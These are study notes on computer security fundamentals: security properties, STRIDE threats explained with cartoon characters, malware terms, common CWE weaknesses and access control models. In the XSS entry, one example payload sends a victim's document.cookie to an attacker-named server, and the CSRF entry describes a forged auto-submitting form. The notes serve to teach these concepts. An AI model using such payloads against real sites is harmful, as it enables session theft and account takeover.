# Basic properties

`Confidentiality`
- keep informations secret
- give read access only to those who need to know
- tools : access control, isolation, encryption

`Integrity`
- keep information correct
- prevent modification of the data
- detect modification
- tools add a hash, a MAC or a signature, make public

`Availability`
- keep information available/systems running
- tools : make copies, duplicate/distribute systems, prevent intrusions

`Authenticity`
- demonstrate the authenticity of information
- prevent fake information
- detect modification
- tools : add keyed hash (MAC) or a signature

`Non repudiation`
- prevent denial of a statement
- tool : add a signature as proof of origin

# Adversarial thinking

## Threat modelling

|Threat|Property threatened|Example|
|-|-|-|
|Spoofing|Authenticity|A member of the council of Ricks convinces Morty that he is the real Rick|
|Tampering|Integrity|The bad minion modifies the plan message sent by Gru to our favorite minion Bob|
|Repudiation|Non-repudiability|Summer denies having told Morty that Rick was waiting for him|
|Information disclosure|Confidentiality|Summer learns about the secret plans of Rick and Morty|
|Denial Of Service|Availability|The minions flood Dr Nefario's lab with bananas and he cannot receive the latest weapons|
|Elevation of Privilege|Authorization|Bob the minion gains access to the system with Gru's credentials|

## Common attacks
`Virus` a malware that infects a file and replicates by infecting other files  
`Worm` a piece of malware that propagate automatically  
`Trojan`
- a malware hidden in a usefull software or file  
- a malware that stays on the victim’s computer and communicate with a control center to carry out malicious activity  

`Rootkit` hides the precense of a malware on a computer  
`Ransomware` encrypts the files and request payment for decryption  
`Vulnerability` weekness in the logic, the software or hardware of a system (bugs)  
`Exploit` method/tool to make advantage of a vulnerability  
Vulnerability can be fixed by `patching` a system  
`Zero day exploit` exploit for which no patch exists yet  
`Trusted Computing Base [TCB]` set of all hardware, firmware, and/or software components that are critical to its security   
`Covert Channel` information leak from unexpected data analysis, e.g: time-based attacks
`Botnets` multiple compromised hosts under the control of a single entity


## Common Weaknesses Enumeration [CWE]

- `Unsanitized inputs` The system acts on inputs that are not sanitized

- `Insecure interaction between components` One subsystem feeds another subsystem data that is not sanitized

- `(CWE 78) OS command injection attack` Inject commands into unchecked data receivers to make the system do things you want the system to do

- `(CWE 79) Cross Site Scripting [XSS]` The script that takes the adversarial input does not run a command but uses the input to dynamically generate web content

```html
http://trustedSite.com/welcome.php?username=’<script>alert(”You’ve been attacked!”);</script>

username=<script>http://carmelaserver/submit?cookie=document.cookie;</script>
```

- `(CWE 352) Cross Site Request Forgery [CSRF]` Create a bait website (Rick and Morty images in the case of big boss Carmela) and use hidden parameters in a form from this website to forge a request to another website B, stealing credentials that authorize the execution of commands in B’s server. Whenever the Rick and Morty page starts loading, hidden inputs are assigned to default values (for example name of malicious student, amount of money to transfer to his account...) and a javascript function ’SendAttack()’ submits the form. The authentication being cookie based when someone is able to execute under the cookie, this adversary gets the privilege of the user and thus the attack is successful. This is an instance of confused deputy problem enabled by the use of ambient authority.

- `(CWE 494) Risky resource management` Never include code that has not been properly verified first in the TCB

    There are 3 different families
    1. Buffer overflow
    2. Feed recently created resources with unsanitized input
    3. Direct execution of code that comes from untrusted sources

- `(CWE 829) Inclusion of functionality from untrusted control sphere` Instead of including untrusted cores directly into our system, we can use frames to separate this code so that the core itself is protected (the new added code is unable to interact with the core)

- `(CWE 306) Missing authentication for critical function`
- `(CWE 862) Missing authorization`
- `(CWE 798) Use of hard-coded credentials`
- `(CWE 311) Missing encryption of sensitive data`
- `(CWE 807) Reliance on untrusted inputs in a security decision`
- `(CWE 250) Execution with unneccessary privileges`
- `(CWE 863) Incorrect authorization`
- `(CWE 732) Incorrect permission asignment for critical resource`
- `(CWE 327) Use of broken or risky cryptographic algorithm`
- `(CWE 307) Improper restriction of excessive authentication attempts`
- `(CWE 759) Use of a one-way hash without a salt`


# Access control

`Clearance` max level a subject has been assigned  

## Mandatory Access Control [MAC]

Centrally controlled, rule based policy  
`Bell-LaPadula` read-down & write-up -> enforces confidentiality  
`Biba` read-up & write-down -> enforces integrity

## Discretionary Access Control [DAC]

Owner specifies policies to access resources it owns

Access control matrix represents rules  
- **stored by column**: access control list (ACL) stored with resource
- **stored by row**: capabilities stored with subjects

> In Unix: Stored in the target object, e.g. in the metadata of files 

`Setuid bit` run as owner  
`Setgid bit` set group to owner's group

## Role-Based Access Control [RBAC]

Group users into roles, each role can contain multiple permissions


